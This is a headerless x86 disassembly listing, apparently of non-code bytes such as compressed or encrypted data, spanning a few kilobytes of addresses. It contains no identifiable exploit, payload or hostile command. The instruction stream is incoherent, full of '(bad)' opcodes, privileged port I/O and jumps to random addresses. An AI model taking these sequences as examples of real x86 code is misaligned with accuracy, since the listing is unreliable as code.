  40b6d9:	les    edi,FWORD PTR ss:[esi]
  40b6dc:	dec    esi
  40b6dd:	jg     0x40b6c1
  40b6df:	jo     0x40b716
  40b6e1:	loope  0x40b70e
  40b6e3:	jae    0x40b722
  40b6e5:	adc    DWORD PTR [edx+0x24],esp
  40b6e8:	sbb    bh,BYTE PTR [ebx-0x215abf13]
  40b6ee:	pop    es
  40b6ef:	mov    ebp,0x4b7eb8be
  40b6f4:	imul   edi,DWORD PTR [ebx],0x6c
  40b6f7:	mul    DWORD PTR [eax+esi*2+0x16debf34]
  40b6fe:	cli    
  40b6ff:	jo     0x40b6fb
  40b701:	mov    WORD PTR [ecx-0x4c],es
  40b704:	mov    dl,0xa5
  40b706:	fcomp  QWORD PTR [ebp+0x62]
  40b709:	jp     0x40b6a9
  40b70b:	push   es
  40b70c:	xchg   ebx,eax
  40b70d:	mov    ds:0x8fe8af4,eax
  40b712:	stc    
  40b713:	jae    0x40b783
  40b715:	out    0xf2,al
  40b717:	or     esp,DWORD PTR [ebp-0x1d]
  40b71a:	and    BYTE PTR [ecx+0x1e],ah
  40b71d:	sbb    al,0x87
  40b71f:	aam    0xe5
  40b721:	lahf   
  40b722:	cli    
  40b723:	xchg   edi,eax
  40b724:	(bad)  
  40b725:	cmp    ebp,DWORD PTR [ebp-0x28]
  40b728:	cmp    al,0x49
  40b72a:	mov    dh,0xb6
  40b72c:	jb     0x40b6f1
  40b72e:	mov    ebp,0xbf2e2ba5
  40b733:	jp     0x40b79a
  40b735:	arpl   WORD PTR [eax+0x67],cx
  40b738:	je     0x40b6ff
  40b73a:	sar    BYTE PTR [ebx],cl
  40b73c:	xchg   BYTE PTR [ebx+ebp*1+0x5624cb74],bh
  40b743:	sbb    eax,0xac16fe77
  40b748:	mov    al,0x31
  40b74a:	pop    ebp
  40b74b:	mov    esp,0x637fd6bd
  40b750:	outs   dx,DWORD PTR ds:[esi]
  40b751:	loopne 0x40b6d4
  40b753:	fistp  WORD PTR [ecx-0x3b]
  40b756:	mov    ebp,0x7ba813a4
  40b75b:	ins    DWORD PTR es:[edi],dx
  40b75c:	adc    dh,0x7d
  40b75f:	adc    eax,0xe8e0d349
  40b764:	or     ah,0xe7
  40b767:	shr    BYTE PTR [esi-0x748ea67e],cl
  40b76d:	xchg   BYTE PTR [ecx],bl
  40b76f:	lods   eax,DWORD PTR ds:[esi]
  40b770:	jle    0x40b779
  40b772:	adc    eax,0xcf1455f9
  40b777:	pop    ebx
  40b778:	inc    ebx
  40b779:	cmp    dl,BYTE PTR [ecx+0x15]
  40b77c:	imul   ebx,DWORD PTR [edx],0xfffffffc
  40b77f:	xor    eax,0x61998124
  40b784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b785:	jbe    0x40b71c
  40b787:	outs   dx,DWORD PTR ds:[esi]
  40b788:	jo     0x40b809
  40b78a:	mov    ah,0x50
  40b78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b78d:	int    0xaf
  40b78f:	pop    edx
  40b790:	inc    eax
  40b791:	dec    ebp
  40b792:	(bad)  
  40b793:	rcr    DWORD PTR [ebx+edx*8+0x35572f7f],cl
  40b79a:	dec    ecx
  40b79b:	and    al,0xa0
  40b79d:	loop   0x40b7a5
  40b79f:	sbb    eax,0x4938d643
  40b7a4:	inc    ebp
  40b7a5:	adc    esi,DWORD PTR [edi-0x4835931b]
  40b7ab:	bound  edi,QWORD PTR [esi+0x69]
  40b7ae:	shr    DWORD PTR [ebp-0x1fb4bb36],0xed
  40b7b5:	popa   
  40b7b6:	out    dx,eax
  40b7b7:	pop    ss
  40b7b8:	ins    BYTE PTR es:[edi],dx
  40b7b9:	mov    ebp,0x37fa52f4
  40b7be:	mov    esi,0x1e94188a
  40b7c3:	and    ch,BYTE PTR [edx-0x11]
  40b7c6:	es push esp
  40b7c8:	add    DWORD PTR [esi],ebx
  40b7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7cb:	and    al,0x4d
  40b7cd:	das    
  40b7ce:	and    eax,0xb79212d
  40b7d3:	jg     0x40b80b
  40b7d5:	add    ah,BYTE PTR [esi+0x14d63c43]
  40b7db:	sti    
  40b7dc:	test   edx,esi
  40b7de:	push   0xd4048c93
  40b7e3:	cmc    
  40b7e4:	jo     0x40b809
  40b7e6:	add    al,0x63
  40b7e8:	loop   0x40b796
  40b7ea:	push   gs
  40b7ec:	rol    BYTE PTR [ebx+0x3b],cl
  40b7ef:	mov    edi,0x15110b26
  40b7f4:	cmp    DWORD PTR [edx],ebx
  40b7f6:	push   cs
  40b7f7:	sub    DWORD PTR [edx-0xf9b7d03],0xffffff96
  40b7fe:	jne    0x40b7aa
  40b800:	mov    ch,0xe2
  40b802:	ins    DWORD PTR es:[edi],dx
  40b803:	stc    
  40b804:	outs   dx,DWORD PTR ds:[esi]
  40b805:	sti    
  40b806:	sahf   
  40b807:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b809:	dec    esi
  40b80a:	pop    ebx
  40b80b:	cmp    eax,0x50a41c47
  40b810:	call   0x6699:0x73472252
  40b817:	mov    eax,ds:0x68f4079b
  40b81c:	pop    ecx
  40b81d:	cmp    eax,0xa06b0b02
  40b822:	fdiv   DWORD PTR [edx]
  40b824:	sar    DWORD PTR [ebp+0x35c6794d],1
  40b82a:	lods   eax,DWORD PTR ds:[esi]
  40b82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b82d:	dec    esi
  40b82e:	dec    edx
  40b82f:	aaa    
  40b830:	cmp    dl,0xef
  40b833:	test   eax,0x64cc1505
  40b838:	mov    BYTE PTR [edx+0x0],ch
  40b83b:	sar    DWORD PTR [edi+0x5725f207],cl
  40b841:	mov    esi,0x29ec1c18
  40b846:	sub    dl,BYTE PTR [ebx+0x6e]
  40b849:	cmp    eax,0x88b7fe5c
  40b84e:	add    ah,BYTE PTR [esi-0x50]
  40b851:	aaa    
  40b852:	push   es
  40b853:	loop   0x40b89d
  40b855:	sbb    esp,DWORD PTR ss:[edi-0x7a7bc1f7]
  40b85c:	jbe    0x40b8c7
  40b85e:	(bad)  
  40b85f:	adc    dh,BYTE PTR [edi]
  40b861:	or     al,0x35
  40b863:	fincstp 
  40b865:	pop    ecx
  40b866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b867:	retf   0x8a80
  40b86a:	nop
  40b86b:	int    0x9b
  40b86d:	test   BYTE PTR [ecx+edi*4-0xf1d1e31],bl
  40b874:	clc    
  40b875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b876:	sti    
  40b877:	ss dec ebx
  40b879:	leave  
  40b87a:	sti    
  40b87b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b87c:	aad    0x37
  40b87e:	loope  0x40b8ee
  40b880:	ret    
  40b881:	dec    edx
  40b882:	enter  0x7065,0x6d
  40b886:	leave  
  40b887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b888:	rol    DWORD PTR [edi],cl
  40b88a:	inc    edx
  40b88b:	les    edx,FWORD PTR [esi]
  40b88d:	and    al,0x2a
  40b88f:	shr    edx,0x69
  40b892:	repnz dec ecx
  40b894:	inc    ecx
  40b895:	cmp    al,0xd
  40b897:	pop    ss
  40b898:	cwde   
  40b899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b89a:	mov    eax,ds:0xa5b1cd84
  40b89f:	clc    
  40b8a0:	inc    ebx
  40b8a1:	push   eax
  40b8a2:	xchg   DWORD PTR [ebp+esi*4+0xa],esp
  40b8a6:	into   
  40b8a7:	mov    ds:0x15fbebe4,eax
  40b8ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ad:	idiv   DWORD PTR ds:0x793128e4
  40b8b3:	cmp    ch,BYTE PTR [edi-0x66e31393]
  40b8b9:	call   FWORD PTR [ebx]
  40b8bb:	(bad)  
  40b8bc:	jmp    0x93d5b24e
  40b8c1:	jl     0x40b8a7
  40b8c3:	ror    DWORD PTR [edx-0x4dc1dae3],cl
  40b8c9:	stc    
  40b8ca:	jns    0x40b917
  40b8cc:	cmp    bl,BYTE PTR [edx]
  40b8ce:	add    al,0x13
  40b8d0:	inc    esi
  40b8d1:	or     ah,BYTE PTR [eax+0x53]
  40b8d4:	xchg   esi,eax
  40b8d5:	ins    DWORD PTR es:[edi],dx
  40b8d6:	add    BYTE PTR [esi+eax*8+0x6b386dc6],dl
  40b8dd:	stos   DWORD PTR es:[edi],eax
  40b8de:	cmp    eax,0xa5e84a2d
  40b8e3:	dec    ecx
  40b8e4:	jl     0x40b94c
  40b8e6:	ins    BYTE PTR es:[edi],dx
  40b8e7:	in     al,0x9c
  40b8e9:	jmp    0x40b95b
  40b8eb:	mov    gs,WORD PTR [edx]
  40b8ed:	rcl    BYTE PTR [esi+0x37906fae],1
  40b8f3:	sahf   
  40b8f4:	push   edx
  40b8f5:	add    ebp,ebx
  40b8f7:	and    bh,al
  40b8f9:	enter  0x2964,0x7e
  40b8fd:	and    eax,DWORD PTR [edx]
  40b8ff:	push   0x2cdee184
  40b904:	stos   DWORD PTR es:[edi],eax
  40b905:	pop    edi
  40b906:	push   esp
  40b907:	inc    edi
  40b908:	(bad)  
  40b909:	mov    BYTE PTR [ecx],0x25
  40b90c:	loop   0x40b901
  40b90e:	jp     0x40b8ca
  40b910:	push   es
  40b911:	in     al,0x98
  40b913:	mov    ch,BYTE PTR [edx-0x6c]
  40b916:	cmp    BYTE PTR [ecx+0x4b],0x7a
  40b91a:	xchg   esp,eax
  40b91b:	adc    ecx,eax
  40b91d:	lods   eax,DWORD PTR ds:[esi]
  40b91e:	leave  
  40b91f:	pop    edx
  40b920:	sbb    eax,0x42d4b424
  40b925:	jae    0x40b998
  40b927:	fld    TBYTE PTR [edi]
  40b929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b92a:	sti    
  40b92b:	std    
  40b92c:	ret    
  40b92d:	push   es
  40b92e:	fldcw  WORD PTR [eax-0x13]
  40b931:	cmp    eax,0x10d31ce7
  40b936:	sub    DWORD PTR [esi+0x64],ecx
  40b939:	push   es
  40b93a:	out    dx,al
  40b93b:	jne    0x40b9a1
  40b93d:	jbe    0x40b8eb
  40b93f:	int    0xf3
  40b941:	iret   
  40b942:	clc    
  40b943:	or     DWORD PTR [esi],0x24a5d97
  40b949:	imul   esp,DWORD PTR [ecx-0x4501418d],0xffffffe4
  40b950:	xchg   esi,eax
  40b951:	or     DWORD PTR [edx],eax
  40b953:	in     eax,dx
  40b954:	popa   
  40b955:	jb     0x40b92d
  40b957:	(bad)  
  40b958:	xchg   edi,eax
  40b959:	adc    DWORD PTR [edi-0x52d2af19],esp
  40b95f:	or     BYTE PTR [eax],dl
  40b961:	xchg   edx,eax
  40b962:	arpl   ax,ax
  40b964:	push   ss
  40b965:	pop    edi
  40b966:	inc    esp
  40b967:	push   ss
  40b968:	dec    edx
  40b969:	xchg   ecx,eax
  40b96a:	dec    edi
  40b96b:	jg     0x40b91a
  40b96d:	test   DWORD PTR [ebx+ebx*1],ecx
  40b970:	sbb    bl,BYTE PTR [eax+0x7aa586b1]
  40b976:	ins    DWORD PTR es:[edi],dx
  40b977:	inc    esi
  40b978:	xor    ebx,DWORD PTR [ecx+0x5c1372d6]
  40b97e:	xlat   BYTE PTR ds:[ebx]
  40b97f:	push   ds
  40b980:	xchg   ebp,eax
  40b981:	js     0x40b9e9
  40b983:	shl    BYTE PTR [ebp+0x62],cl
  40b986:	xchg   BYTE PTR [esi],cl
  40b988:	xlat   BYTE PTR ds:[ebx]
  40b989:	jmp    0x850a8ee2
  40b98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b98f:	clc    
  40b990:	outs   dx,BYTE PTR ds:[esi]
  40b991:	mov    eax,0xfa2845e1
  40b996:	ret    
  40b997:	cmp    al,0x4f
  40b999:	push   eax
  40b99a:	or     BYTE PTR [edx+0x9],0x7
  40b99e:	adc    BYTE PTR [edi],al
  40b9a0:	xor    eax,0xf53b08e6
  40b9a5:	popa   
  40b9a6:	mov    esp,0x4da8a192
  40b9ab:	xchg   ecx,eax
  40b9ac:	add    al,0xc8
  40b9ae:	jge    0x40b9f9
  40b9b0:	test   eax,esp
  40b9b2:	push   ebp
  40b9b3:	mov    eax,ds:0xf2c9f8cb
  40b9b8:	and    DWORD PTR [eax],ecx
  40b9ba:	(bad)
  40b9be:	pop    edi
  40b9bf:	xchg   esi,eax
  40b9c0:	push   edx
  40b9c1:	out    0x73,eax
  40b9c3:	cmp    BYTE PTR [ebx+0x5],ch
  40b9c6:	mov    esi,0x8a1dc11f
  40b9cb:	jns    0x40b9b4
  40b9cd:	adc    al,0x6e
  40b9cf:	add    eax,0xe28b344e
  40b9d4:	inc    edx
  40b9d5:	in     eax,0x90
  40b9d7:	ja     0x40b9b3
  40b9d9:	mov    ecx,0x449f592d
  40b9de:	xchg   esp,eax
  40b9df:	cmc    
  40b9e0:	or     dl,BYTE PTR [ecx-0x70]
  40b9e3:	xor    eax,0xc0a46731
  40b9e8:	jmp    DWORD PTR [ebx+0x6bc1d2cb]
  40b9ee:	push   ds
  40b9ef:	jmp    0x40ba62
  40b9f1:	repnz lods al,BYTE PTR ds:[esi]
  40b9f3:	sbb    DWORD PTR [esi+eiz*4-0x3fcf2c18],ebx
  40b9fa:	out    0xd2,eax
  40b9fc:	popf   
  40b9fd:	in     al,dx
  40b9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ba01:	repnz mov WORD PTR [ecx-0x12bb4708],ds
  40ba08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba09:	push   0x4d
  40ba0b:	fidivr DWORD PTR [ebx+0x4f33c9e9]
  40ba11:	push   ebx
  40ba12:	loope  0x40ba39
  40ba14:	in     eax,dx
  40ba15:	imul   esi,DWORD PTR [esi+eiz*8-0x40f9178c],0xd96d5161
  40ba20:	push   ss
  40ba21:	add    eax,0x3b914b74
  40ba26:	hlt    
  40ba27:	add    ecx,DWORD PTR [ebx]
  40ba29:	mov    DWORD PTR [esi+0x1e],ebp
  40ba2c:	sbb    al,0xc
  40ba2e:	ss dec edi
  40ba30:	outs   dx,DWORD PTR ds:[esi]
  40ba31:	cmp    edi,DWORD PTR [ebx+0x67157bdb]
  40ba37:	adc    ebx,DWORD PTR [ebx+0x223c21b2]
  40ba3d:	jbe    0x40ba21
  40ba3f:	push   es
  40ba40:	lahf   
  40ba41:	hlt    
  40ba42:	add    ecx,DWORD PTR [esi]
  40ba44:	ins    DWORD PTR es:[edi],dx
  40ba45:	fs mov al,bl
  40ba48:	sub    cl,ah
  40ba4a:	cmp    ebx,DWORD PTR [ebx-0x4c571d97]
  40ba50:	xchg   ebp,eax
  40ba51:	cld    
  40ba52:	xchg   ebx,eax
  40ba53:	mov    al,ds:0x35323ce1
  40ba58:	jnp    0x40ba48
  40ba5a:	inc    ebx
  40ba5b:	sbb    al,0xcb
  40ba5d:	add    DWORD PTR [eax-0x707b7591],edx
  40ba63:	fdivrp st(4),st
  40ba65:	retf   0x4648
  40ba68:	mov    dl,0x34
  40ba6a:	(bad)  
  40ba6b:	xchg   ebp,eax
  40ba6c:	push   0xfffffffb
  40ba6e:	in     al,dx
  40ba6f:	xor    eax,0xb46880d4
  40ba74:	fldcw  WORD PTR [ecx+0x65]
  40ba77:	mov    BYTE PTR [edx-0x2bdee91f],al
  40ba7d:	push   cs
  40ba7e:	lock push 0x5f
  40ba81:	or     eax,0x65a488b1
  40ba86:	jae    0x40ba40
  40ba88:	into   
  40ba89:	cld    
  40ba8a:	dec    esp
  40ba8b:	jb     0x40baf9
  40ba8d:	outs   dx,BYTE PTR ds:[esi]
  40ba8e:	mov    esi,0x66ba25fa
  40ba93:	std    
  40ba94:	xchg   BYTE PTR [ebp-0x68],ch
  40ba97:	add    DWORD PTR [edi+ebp*8+0x2acd25d],0xdb2a7ba9
  40baa2:	and    BYTE PTR [esi+ebp*1],dh
  40baa5:	adc    BYTE PTR [ecx+edi*4],ch
  40baa8:	xchg   esp,eax
  40baa9:	pop    ebp
  40baaa:	jl     0x40ba44
  40baac:	push   edi
  40baad:	(bad)  
  40baae:	out    dx,al
  40baaf:	popa   
  40bab0:	rcr    BYTE PTR [esp+esi*4],cl
  40bab3:	mov    ah,0xcb
  40bab5:	in     eax,dx
  40bab6:	jmp    0x40ba43
  40bab8:	add    cl,BYTE PTR [ecx+edi*1+0x2c]
  40babc:	add    BYTE PTR [eax],0x5b
  40babf:	xchg   ebx,eax
  40bac0:	fs add al,0x59
  40bac3:	xchg   ebp,eax
  40bac4:	loopne 0x40bab2
  40bac6:	pop    ebp
  40bac7:	imul   ebp
  40bac9:	and    eax,0xe52a1f1c
  40bace:	fdiv   st(4),st
  40bad0:	(bad)  
  40bad1:	enter  0xdca8,0x64
  40bad5:	fldcw  WORD PTR ds:0x3b712814
  40badb:	or     al,0x67
  40badd:	es push ebx
  40badf:	push   ebx
  40bae0:	je     0x40baba
  40bae2:	mov    edx,0xcd788e7c
  40bae7:	xchg   ecx,eax
  40bae8:	add    cl,cl
  40baea:	cwde   
  40baeb:	add    eax,0xebcef37a
  40baf0:	push   ss
  40baf1:	fldpi  
  40baf3:	test   al,0x59
  40baf5:	cmc    
  40baf6:	shl    esp,1
  40baf8:	enter  0x7d75,0x9
  40bafc:	xor    al,0xf3
  40bafe:	jp     0x40bb19
  40bb00:	fiadd  DWORD PTR [eax-0x1452a03b]
  40bb06:	js     0x40bb67
  40bb08:	ds cli 
  40bb0a:	add    ch,BYTE PTR [ebp+0x5ddddea1]
  40bb10:	sbb    cl,bh
  40bb12:	fidivr WORD PTR [edx-0x16]
  40bb15:	unpckhps xmm1,XMMWORD PTR [ebx-0x14c7de8c]
  40bb1c:	pop    ds
  40bb1d:	adc    edi,DWORD PTR [edx+0x407ee028]
  40bb23:	or     BYTE PTR [eax-0x1c],dh
  40bb26:	cwde   
  40bb27:	popa   
  40bb28:	in     eax,dx
  40bb29:	xor    al,0x5b
  40bb2b:	dec    ecx
  40bb2c:	inc    ebp
  40bb2d:	loope  0x40bb2f
  40bb2f:	fstp   TBYTE PTR [edx]
  40bb31:	sub    BYTE PTR [ebx-0x399650fe],0x32
  40bb38:	add    eax,edi
  40bb3a:	test   DWORD PTR [ecx+ebx*4-0x53],eax
  40bb3e:	ja     0x40bb27
  40bb40:	lds    ebx,FWORD PTR [edi]
  40bb42:	cmp    ebp,ecx
  40bb44:	jae    0x40bbb9
  40bb46:	adc    BYTE PTR [edx],0x9d
  40bb49:	and    DWORD PTR [ebx+eax*8],edi
  40bb4c:	out    dx,al
  40bb4d:	aas    
  40bb4e:	fsub   st(7),st
  40bb50:	xchg   ebx,eax
  40bb51:	mov    ebp,0x2bfb3a63
  40bb56:	add    edi,DWORD PTR [ebp+esi*8-0x5bac0d1]
  40bb5d:	mov    BYTE PTR [edi],al
  40bb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb60:	sbb    DWORD PTR [ebx-0x64704098],ebp
  40bb66:	fistp  DWORD PTR [eax-0x45]
  40bb69:	inc    esp
  40bb6a:	rol    BYTE PTR [eax+0x63a23db6],cl
  40bb70:	inc    ebp
  40bb71:	(bad)  
  40bb72:	fst    DWORD PTR [edx-0x43b215db]
  40bb78:	es mov ch,0x88
  40bb7b:	dec    esi
  40bb7c:	scas   al,BYTE PTR es:[edi]
  40bb7d:	add    eax,0x38d49baf
  40bb82:	je     0x40bb87
  40bb84:	cdq    
  40bb85:	bound  edi,QWORD PTR [eax-0x2d330044]
  40bb8b:	jge    0x40bbf8
  40bb8d:	lahf   
  40bb8e:	cmp    esi,ebx
  40bb90:	les    ecx,FWORD PTR [edi]
  40bb92:	mov    ecx,0x27efe0c9
  40bb97:	cmp    al,ch
  40bb99:	adc    BYTE PTR [eax+0x60],bh
  40bb9c:	xchg   DWORD PTR [ebp+0x4ee74055],ecx
  40bba2:	in     eax,0xd
  40bba4:	adc    DWORD PTR [edx],edx
  40bba6:	mov    dh,BYTE PTR [edx+ebp*2-0x10aa8053]
  40bbad:	out    0x6b,eax
  40bbaf:	out    0x75,al
  40bbb1:	(bad)  
  40bbb2:	out    dx,eax
  40bbb3:	lock lock jmp 0xc68c:0x2658c73b
  40bbbc:	push   edi
  40bbbd:	fcomp  QWORD PTR [ecx+0x2e6c79cd]
  40bbc3:	imul   edi
  40bbc5:	mov    ch,BYTE PTR [eax+0x7f]
  40bbc8:	or     ch,BYTE PTR [edx+0x52]
  40bbcb:	int3   
  40bbcc:	mov    ecx,0x5825e641
  40bbd1:	push   0xf9f84227
  40bbd6:	dec    DWORD PTR [esi]
  40bbd8:	pop    ss
  40bbd9:	mov    ah,BYTE PTR [eax+ecx*2]
  40bbdc:	xchg   DWORD PTR [edi-0x731e394c],edi
  40bbe2:	lods   al,BYTE PTR ss:[esi]
  40bbe4:	add    ecx,DWORD PTR [edi+0x35]
  40bbe7:	and    DWORD PTR [ebx+0x5690ead1],0x16
  40bbee:	js     0x40bb7d
  40bbf0:	je     0x40bc2d
  40bbf2:	ja     0x40bc39
  40bbf4:	adc    BYTE PTR [edx-0x1fc12466],bh
  40bbfa:	fdivr  QWORD PTR [edi+edi*4-0x43626c7f]
  40bc01:	clc    
  40bc02:	mov    ebx,0x599f5d0c
  40bc07:	fmul   QWORD PTR [esi+0x5b]
  40bc0a:	shr    dl,0xd1
  40bc0d:	xchg   esi,eax
  40bc0f:	adc    al,0x47
  40bc11:	mov    esp,0xfcfc6000
  40bc16:	mov    bh,bl
  40bc18:	push   esp
  40bc19:	les    esp,FWORD PTR [ebx*1+0x6da336b8]
  40bc20:	mov    esp,0xf6155714
  40bc25:	loope  0x40bca0
  40bc27:	ins    BYTE PTR es:[edi],dx
  40bc28:	popf   
  40bc29:	push   esp
  40bc2a:	xchg   esi,eax
  40bc2b:	mov    eax,ds:0x27926c39
  40bc30:	add    al,0xe7
  40bc32:	and    BYTE PTR ds:0x6db36f3d,bh
  40bc38:	loop   0x40bc2d
  40bc3a:	mov    ecx,0xdad35d9
  40bc3f:	rol    DWORD PTR [edi+eiz*8-0x3c],0x16
  40bc44:	adc    BYTE PTR [edx-0x75d033b],ch
  40bc4a:	push   0xc9c09a33
  40bc4f:	sbb    bh,BYTE PTR [eax-0x29]
  40bc52:	pop    edi
  40bc53:	test   eax,0xd8b911e7
  40bc58:	inc    edx
  40bc59:	mov    al,ds:0xc7ea3a17
  40bc5e:	ret    
  40bc5f:	mov    cl,0x2c
  40bc61:	mov    ah,0x53
  40bc63:	retf   
  40bc64:	rcr    DWORD PTR [edi+0x45],0x6c
  40bc68:	mov    ch,0x51
  40bc6a:	adc    al,0xe2
  40bc6c:	push   ecx
  40bc6d:	stos   DWORD PTR es:[edi],eax
  40bc6e:	dec    edi
  40bc6f:	ins    DWORD PTR es:[edi],dx
  40bc70:	push   ebx
  40bc71:	js     0x40bc92
  40bc73:	in     eax,0xc7
  40bc75:	aaa    
  40bc76:	cs inc eax
  40bc78:	ds mov eax,ds
  40bc7b:	shl    DWORD PTR [esi+0x38],1
  40bc7e:	adc    eax,0xa5c775f3
  40bc83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc84:	xchg   DWORD PTR [ecx+0x18],esi
  40bc87:	inc    esi
  40bc88:	pop    ebp
  40bc89:	loope  0x40bd00
  40bc8b:	cld    
  40bc8c:	xor    DWORD PTR [ecx],ecx
  40bc8e:	std    
  40bc8f:	loopne 0x40bc7f
  40bc91:	or     bh,BYTE PTR [ecx-0x5159da7d]
  40bc97:	jl     0x40bcc2
  40bc99:	pop    ds
  40bc9a:	sbb    eax,0xc4916768
  40bc9f:	lea    edi,[esi]
  40bca1:	mov    esi,ebp
  40bca3:	pop    ss
  40bca4:	pop    esp
  40bca5:	in     al,dx
  40bca6:	leave  
  40bca7:	or     DWORD PTR [ecx],eax
  40bca9:	xor    eax,0x17352d30
  40bcae:	(bad)  
  40bcaf:	mov    bl,0xe3
  40bcb1:	pop    es
  40bcb2:	push   ebp
  40bcb3:	fdiv   QWORD PTR [ebx+ebx*4]
  40bcb6:	div    DWORD PTR [edi+0xc]
  40bcb9:	dec    esp
  40bcba:	(bad)  
  40bcbc:	popf   
  40bcbd:	cmp    esp,DWORD PTR [esi-0x328c3e8c]
  40bcc3:	lea    ecx,[edi-0x12]
  40bcc6:	rol    DWORD PTR [edx-0x171485cd],cl
  40bccc:	outs   dx,DWORD PTR ds:[esi]
  40bccd:	or     eax,DWORD PTR [edx]
  40bccf:	cmc    
  40bcd0:	call   0x7240:0x7c45f603
  40bcd7:	test   bh,cl
  40bcd9:	(bad)  
  40bcda:	loop   0x40bc7e
  40bcdc:	mov    esp,ss
  40bcde:	shl    BYTE PTR [edi+0x57a47ec0],0xe1
  40bce5:	xchg   BYTE PTR [ecx+0x2a7c10b0],ch
  40bceb:	lea    edi,[edx-0x9722b1a]
  40bcf1:	and    DWORD PTR [ecx],0x3a49da5a
  40bcf7:	outs   dx,BYTE PTR ds:[esi]
  40bcf8:	mov    bh,0x12
  40bcfa:	xor    al,0x20
  40bcfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcfd:	ss pop eax
  40bcff:	fild   QWORD PTR [ecx-0x55]
  40bd02:	push   cs
  40bd03:	cmp    al,0x8
  40bd05:	jle    0x40bce5
  40bd07:	sub    eax,0xc8eea802
  40bd0c:	push   esi
  40bd0d:	sti    
  40bd0e:	push   edi
  40bd0f:	ja     0x40bc93
  40bd11:	mov    ?,WORD PTR [edx-0x1]
  40bd14:	cwde   
  40bd15:	ror    DWORD PTR [eax+ebx*8-0x516ad151],0x7e
  40bd1d:	cmp    BYTE PTR [eax+0x18],cl
  40bd20:	test   DWORD PTR [esi+edi*1+0x49],ebp
  40bd24:	adc    al,0x48
  40bd26:	popf   
  40bd27:	arpl   WORD PTR [ebx],sp
  40bd29:	jbe    0x40bd05
  40bd2b:	or     eax,0x47f00abb
  40bd30:	xor    BYTE PTR [ecx],ch
  40bd32:	sbb    DWORD PTR [edi],ebx
  40bd34:	cwde   
  40bd35:	push   edi
  40bd36:	dec    edi
  40bd37:	jne    0x40bd3d
  40bd39:	mov    al,0x8d
  40bd3b:	pop    eax
  40bd3c:	mov    edx,0x38a6808a
  40bd41:	es jg  0x40bd30
  40bd44:	je     0x40bd90
  40bd46:	mov    edx,0xf400fe6a
  40bd4b:	add    DWORD PTR [ebx],ebx
  40bd4d:	sbb    al,0x7f
  40bd4f:	push   ecx
  40bd50:	adc    al,BYTE PTR ds:0xe92d694
  40bd56:	fstp   QWORD PTR [eax+0x6870dc28]
  40bd5c:	xchg   edi,eax
  40bd5d:	mov    al,ds:0x4da8a72b
  40bd62:	jnp    0x40bd68
  40bd64:	add    ah,BYTE PTR [ebx-0x3b]
  40bd67:	ret    0x20c2
  40bd6a:	dec    edx
  40bd6b:	mov    ebx,0x73d7eeec
  40bd70:	loope  0x40bcfd
  40bd72:	and    eax,0x6bec730b
  40bd77:	lahf   
  40bd78:	icebp  
  40bd79:	(bad)  [eax+ebp*4-0x3455171f]
  40bd80:	inc    esp
  40bd81:	ins    DWORD PTR es:[edi],dx
  40bd82:	cmp    al,0xed
  40bd84:	aad    0x32
  40bd86:	neg    BYTE PTR [edi-0x7d]
  40bd89:	or     DWORD PTR [ebx],esi
  40bd8b:	pop    edx
  40bd8c:	add    ebp,edx
  40bd8e:	rcr    BYTE PTR [edi+0x79],1
  40bd91:	test   DWORD PTR [ebx+ecx*4-0x701efa31],ecx
  40bd98:	ret    
  40bd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd9a:	sahf   
  40bd9b:	repnz and DWORD PTR [edi+eiz*2+0x25],edi
  40bda0:	jnp    0x40bd62
  40bda2:	shl    DWORD PTR [ecx+0x4b],cl
  40bda5:	ds pop ecx
  40bda7:	loope  0x40bdcc
  40bda9:	mov    esi,eax
  40bdab:	cdq    
  40bdac:	(bad)
  40bdb0:	pop    ebx
  40bdb1:	inc    edi
  40bdb2:	jne    0x40bdea
  40bdb4:	shl    DWORD PTR [edx+edi*2+0x58667c5f],cl
  40bdbb:	movzx  eax,dh
  40bdbe:	xchg   ebp,eax
  40bdbf:	mov    ch,0x3f
  40bdc1:	jns    0x40bdfc
  40bdc3:	nop
  40bdc4:	mov    WORD PTR [edi+0x1ec6d4db],ss
  40bdca:	cmp    edx,DWORD PTR [ebx+0x67]
  40bdcd:	call   0x7623:0xbc209554
  40bdd4:	xchg   DWORD PTR [ebx+0x1e],ebp
  40bdd7:	push   esp
  40bdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd9:	fcom   st(5)
  40bddb:	or     eax,0x5d434d2b
  40bde0:	or     eax,0xe04e16f9
  40bde5:	mov    edi,ebx
  40bde7:	xchg   DWORD PTR [ebp+0x4],ebp
  40bdea:	out    0x72,al
  40bdec:	retf   0x6b8d
  40bdef:	mov    esi,0x798fc5ba
  40bdf4:	jp     0x40be3c
  40bdf6:	push   0xffffffe8
  40bdf8:	mov    cl,0x74
  40bdfa:	xchg   DWORD PTR [ecx],ebx
  40bdfc:	mov    ch,0x15
  40bdfe:	xchg   DWORD PTR ss:[ebx-0x46],ecx
  40be02:	add    al,0x96
  40be04:	mov    bh,0x44
  40be06:	sub    BYTE PTR [ebx],dh
  40be08:	or     BYTE PTR [edx],dh
  40be0a:	sub    al,0x69
  40be0d:	call   0x49a416c1
  40be12:	(bad)  
  40be13:	clc    
  40be14:	adc    al,0x55
  40be16:	retf   
  40be17:	inc    ecx
  40be18:	inc    edi
  40be19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
